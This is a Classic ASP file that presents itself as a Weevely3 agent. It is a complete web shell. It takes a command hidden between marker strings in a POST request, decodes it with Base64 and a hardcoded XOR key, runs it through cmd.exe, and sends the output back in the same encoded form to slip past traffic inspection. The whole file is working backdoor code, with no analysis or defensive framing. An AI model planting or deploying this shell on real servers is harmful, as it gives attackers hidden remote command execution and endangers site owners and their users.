b'\n\n<%\nOption Explicit\nOn Error Resume Next\n\n\' Weevely3 Classic ASP Agent\n\' Implements XOR -> Base64 protocol (No GZIP due to VBScript limitations)\n\nFunction XorStr(text, key)\n    Dim i, klen, res, c\n    klen = Len(key)\n    res = ""\n    For i = 1 To Len(text)\n        c = Asc(Mid(text, i, 1)) Xor Asc(Mid(key, ((i - 1) Mod klen) + 1, 1))\n        res = res & Chr(c)\n    Next\n    XorStr = res\nEnd Function\n\nFunction Base64Decode(s)\n    Dim xml, node\n    Set xml = CreateObject("MSXML2.DOMDocument")\n    Set node = xml.CreateElement("b64")\n    node.DataType = "bin.base64"\n    node.Text = s\n    Base64Decode = Stream_BinaryToString(node.NodeTypedValue)\n    Set node = Nothing\n    Set xml = Nothing\nEnd Function\n\nFunction Base64Encode(s)\n    Dim xml, node\n    Set xml = CreateObject("MSXML2.DOMDocument")\n    Set node = xml.CreateElement("b64")\n    node.DataType = "bin.base64"\n    node.NodeTypedValue = Stream_StringToBinary(s)\n    Base64Encode = node.Text\n    Set node = Nothing\n    Set xml = Nothing\nEnd Function\n\nFunction Stream_StringToBinary(Text)\n  Dim BinaryStream\n  Set BinaryStream = CreateObject("ADODB.Stream")\n  BinaryStream.Type = 2 \'adTypeText\n  BinaryStream.CharSet = "iso-8859-1"\n  BinaryStream.Open\n  BinaryStream.WriteText Text\n  BinaryStream.Position = 0\n  BinaryStream.Type = 1 \'adTypeBinary\n  Stream_StringToBinary = BinaryStream.Read\n  Set BinaryStream = Nothing\nEnd Function\n\nFunction Stream_BinaryToString(Binary)\n  Dim BinaryStream\n  Set BinaryStream = CreateObject("ADODB.Stream")\n  BinaryStream.Type = 1 \'adTypeBinary\n  BinaryStream.Open\n  BinaryStream.Write Binary\n  BinaryStream.Position = 0\n  BinaryStream.Type = 2 \'adTypeText\n  BinaryStream.CharSet = "iso-8859-1"\n  Stream_BinaryToString = BinaryStream.ReadText\n  Set BinaryStream = Nothing\nEnd Function\n\nFunction ExecuteCmd(cmd)\n    Dim shell, exec, output\n    Set shell = Server.CreateObject("WScript.Shell")\n    Set exec = shell.Exec("cmd.exe /c " & cmd)\n    output = exec.StdOut.ReadAll() & exec.StdErr.ReadAll()\n    ExecuteCmd = output\n    Set exec = Nothing\n    Set shell = Nothing\nEnd Function\n\nDim k, kh, kf, p, content, start, finish, payload, decoded, unxorred, output, reXorred, encoded\n\nk = "5f4dcc3b"\nkh = "5aa765d61d83"\nkf = "27deb882cf99"\np = "ZB886yENqB9kOh13"\n\nIf Request.ServerVariables("REQUEST_METHOD") = "POST" Then\n    content = Request.BinaryRead(Request.TotalBytes)\n    content = Stream_BinaryToString(content)\n    \n    start = InStr(content, kh)\n    finish = InStr(content, kf)\n    \n    If start > 0 And finish > 0 Then\n        payload = Mid(content, start + Len(kh), finish - (start + Len(kh)))\n        \n        \' Decode: Base64 -> XOR\n        decoded = Base64Decode(payload)\n        unxorred = XorStr(decoded, k)\n        \n        \' Execute\n        output = ExecuteCmd(unxorred)\n        \n        \' Encode: XOR -> Base64\n        reXorred = XorStr(output, k)\n        encoded = Base64Encode(reXorred)\n        \n        Response.Write p & kh & encoded & kf\n    End If\nEnd If\n%>\n'
